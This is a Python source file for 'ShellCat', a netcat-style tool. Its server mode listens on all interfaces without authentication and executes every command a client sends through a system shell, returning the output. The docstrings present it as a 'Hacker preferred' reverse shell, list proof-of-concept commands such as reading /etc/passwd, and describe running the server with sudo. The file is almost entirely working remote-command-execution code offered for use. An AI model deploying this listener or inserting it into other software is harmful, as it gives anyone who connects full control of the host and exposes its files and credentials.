from signal import signal, SIGPIPE, SIGINT

import argparse
import os
import socket
import subprocess
import sys
import textwrap
import threading


# Error Handling - KeyboardInterrupt - Display Message
def sigint_handler(signal, frame):
    print("\n\n\t＊＊＊ ＷＡＲＮＩＮＧ ＊＊＊\n")
    print("DETECTED:\tKeyboardInterrupt\t- User has Interrupted session")
    print("CLOSING:\tShellCat.py")
    print("\n\r")
    os._exit(0)


signal(SIGINT, sigint_handler)


# Error Handling - BrokenPipeError - Display Message
def sigpipe_handler(signal, frame):
    print("\n\n\t＊＊＊ ＷＡＲＮＩＮＧ ＊＊＊\n")
    print("DETECTED:\tBrokenPipeError\t- Server Connections was lost")
    print("CLOSING:\tShellCat.py")
    print("\n\r")
    os._exit(0)


signal(SIGPIPE, sigpipe_handler)


class ClientMode:
    """ ClientMode Class 

        - host & port bind: Creating a Socket
        - receive: Loop to handle data(bytes) and responses back to server
        - send: send data to server
        - run_once: encode commands to send to server, decode response
        - run: accept connection from server + display shell and allow input from user


        Operation of ClientMode:

        There are two modes of operation from the client-side, Default and Shell mode.



        Default mode:

            example:    python3 shellcat.py client -t 192.168.1.10 -p 5555

        This mode is less interactive as opposed to Shell mode when used with the ServerMode.

        It requires that you send a new line (Enter/Return) by pressing CTRL+D, which will force the command to send and operate on the server-side. Once the command forwards and executes, a response from the server will display the command output on the client side.


        *** Currently Under Maintenance - WebApp Testing ***
        The default mode of operation is better suited for testing web apps and does not require the use of the ServerMode to be operating, similar to how netcat could be used to test web pages.

            example:    python3 shellcat.py client -t google.com -p 80



        Shell mode:

            example:    python3 shellcat.py client -t 192.168.1.10 -p 5555 -s

        This mode is more user friendly, spawning an interactive shell that allows commands to be sent with Enter/Return key as opposed to forcing a new line with CTRL+D (Default mode).

        Shell mode is more like a reverse shell (Hacker preferred)


        Some example commands for POC:

        -   cat /etc/passwd
        -   pwd
        -   ls -a
        -   ls -alh /home/{user}/Downloads


        Issues:
        Commands requiring Sudo privileges require that the server-side is launched with Sudo
        - see ServerMode below for further details

        Not all commands are functioning at this point
        -   cd (change directory): not able to change directories currently and shell hangs
    """

    def __init__(self, host, port):
        self.host = host
        self.port = port

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((host, port))

    """ receive method

        - receive response data in the form of bytes
        - check byte length
        - return response (receive)
    
    """

    def receive(self):
        response = b""
        while True:
            data_chunk = self.client.recv(4096)
            response = response + data_chunk
            if len(data_chunk) < 4096:
                break
        return response

    def send(self, data):
        """ send method

            - send data to server

        """
        self.client.send(data)

    def run_once(self, data):
        """ run_once method 

            - Encode received data from run
            - call send

        """
        self.client.send(data.encode("UTF-8"))
        received = self.receive()
        print(received.decode("UTF-8"))

    def run(self, shell=False):
        """ run method 

            - Spawn a shell to display in client
            - Read input from user as STDIN - data
            - Send data to run_once

        """
        while True:
            if shell:
                data = input("[ShellCat]-[$] ")
            else:
                data = sys.stdin.read()
            self.run_once(data)


class ServerMode:
    """ ServerMode Class

        - host & port bind: creating a socket
        - run: accept incoming connection from client and thread handling
        - connection_handler: handle connection + encode/decode commands
            - handle quit command from client
            - handle command execution from client
            - display/record command executed from client on server side
        - receive: Loop to handle data(bytes) and responses back to client



        Operation of ServerMode:

        The server-side is where the commands will be operating from; the client connects to the server, sends a command that is then executed on the server-side, then the server reports back to the client with output.

        Launch server - Remote & Local Use:

            example:    python3 shellcat.py server -t 10.10.10.150 -p 5555


        Launch server - open with All IPs 0.0.0.0 (Should only use local):

            example:    python3 shellcat.py server -p 5555


        Launch server with Sudo privileges:

            example:    sudo python3 shellcat.py -t 0.0.0.0 -p 5555

            (Just append sudo to the beginning - and enter sudo password)


        Once the server is launched, you can launch the client-side and begin sending commands from the client to the server.

        If the client leaves or drops out, the server will remain open until a new connection is made from a client.

        However, if the server closes, it will force the client to stop and will require the client to reconnect.

    """

    def __init__(self, host, port, banner=None):
        self.host = host
        self.port = port
        self.banner = banner

        """ bind socket 

            - allow socket resuse
            - listen up to 5 client connections    

        """

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)

    def run(self):
        """ run method 

            - accept connection from client
                - display connection made
            - threading - handle multiple incoming connections

        """
        while True:
            connection, address = self.server.accept()
            print(
                f"[SHELLCAT_SERVER]\r\n[*]\tCONNECTION FROM:\t{address[0]}:{address[1]}")
            # thread handling
            threading_handler = threading.Thread(
                target=self.connection_handler, args=(connection, address))
            threading_handler.start()

    def connection_handler(self, connection, address):
        """ connections_handler method 

            - accept incoming bytes(commands) and decode
            - if command is !q or quit - close connection off to server
                - respond to client 'You have !q/quit'
            - if STDIN command is received process the command with subprocess
                - respond to client STDOUT

        """
        if self.banner:
            connection.send(self.banner.encode("UTF-8"))

        try:
            while True:
                command = self.receive(connection)
                command = command.splitlines()[0]
                command = command.decode("UTF-8")

                if command == "!q" or command == "quit":
                    print(
                        f"[SHELLCAT_SERVER]\r\n[*]\tCONNECTION CLOSED:\t{address[0]}:{address[1]}")
                    connection.send(
                        b"\r\nSERVER:\t\tYou have !q/quit\r\n\t\tCtrl+C to close client")
                    connection.close()
                    return

                print(f"[*]\tCOMMAND:\t{command}")
                process = subprocess.run(
                    command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                connection.send(process.stdout)

        except IndexError:
            print(
                "\n\n\t＊＊＊ ＷＡＲＮＩＮＧ ＊＊＊\n\nCLIENT CLOSED:\tCtrl+C to exit or wait for new client connection")

    def receive(self, connection):
        """ receive method

            - receive response data in the form of bytes
            - check byte length
            - return response - receive

        """
        response = b""
        while True:
            data_chunk = connection.recv(4096)
            response = response + data_chunk
            if len(data_chunk) < 4096:
                break
        return response


def main():
    """ Argparse CLI arguments:

        - Argparse main + examples
            - top level
        - Client args (client)
            - sub level
        - Server args (server)
            - sub level


        Display Argparse help commands and examples of use.


        Top Level Args Help:

            example:    python3 shellcat.py -h
                        python3 shellcat.py --help


        Client Args Help:

            example:    python3 shellcat.py client -h


        Server Args Help:

            example:    python3 shellcat.py server -h

    """

    """ Top level
        
        + examples
    """

    parser = argparse.ArgumentParser(description="ShellCat",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent("""Example Use:
                                    \r\n  - Server Launcher
                                    \r\tshellcat.py server -t 0.0.0.0 -p 5555
                                    \r\n  - Client Launcher + reverse shell
                                    \r\tshellcat.py client -t 0.0.0.0 -p 5555 -s
                                    """
                                                            ))
    subparser = parser.add_subparsers(title="SubCommands",
                                      description="TRY: \'shellcat.py server -h\' OR \'shellcat.py client -h\'",
                                      )

    """ Client Args """

    client_parser = subparser.add_parser("client",
                                         help="Client Mode: Run client side - Send commands to server",
                                         )
    client_parser.add_argument('-t', '--target',
                               required=True,
                               help="Target: Target host/ip",
                               )
    client_parser.add_argument('-p', '--port',
                               required=True,
                               type=int,
                               help="Port: The server port in use",
                               )
    client_parser.add_argument('-s', '--shell',
                               action="store_true",
                               help="Shell: Allow commands to be executed",
                               )
    client_parser.set_defaults(mode="client")

    """ Server Args """

    server_parser = subparser.add_parser("server",
                                         help="Server Mode: Run server Side - Receive commands from client",
                                         )
    server_parser.add_argument('-t', '--target',
                               default="0.0.0.0",
                               help="Target: Host to bind to",
                               )
    server_parser.add_argument('-p', '--port',
                               required=True,
                               type=int,
                               help='Port: Port to open and listen on',
                               )
    server_parser.set_defaults(mode="server")

    args = parser.parse_args()

    try:
        mode = args.mode
    except AttributeError:
        parser.print_usage()
        return

    try:
        if mode == 'client':
            client = ClientMode(args.target, args.port)
            if args.shell:
                print(
                    f"\n[SHELLCAT_CLIENT]\n[*]\tCONNECTED TO:\t\t{args.target}:{args.port}\n")
            client.run(shell=args.shell)
    except ConnectionRefusedError:
        print(
            "\n\n\t＊＊＊ ＷＡＲＮＩＮＧ ＊＊＊\n\nERROR CONNECTING:\tCheck server is running")

    else:
        server = ServerMode(args.target, args.port)
        print(
            f"\n[SHELLCAT_SERVER]\n[*]\tLISTENING ON:\t\t{args.target}:{args.port}\n")
        server.run()


if __name__ == "__main__":
    main()
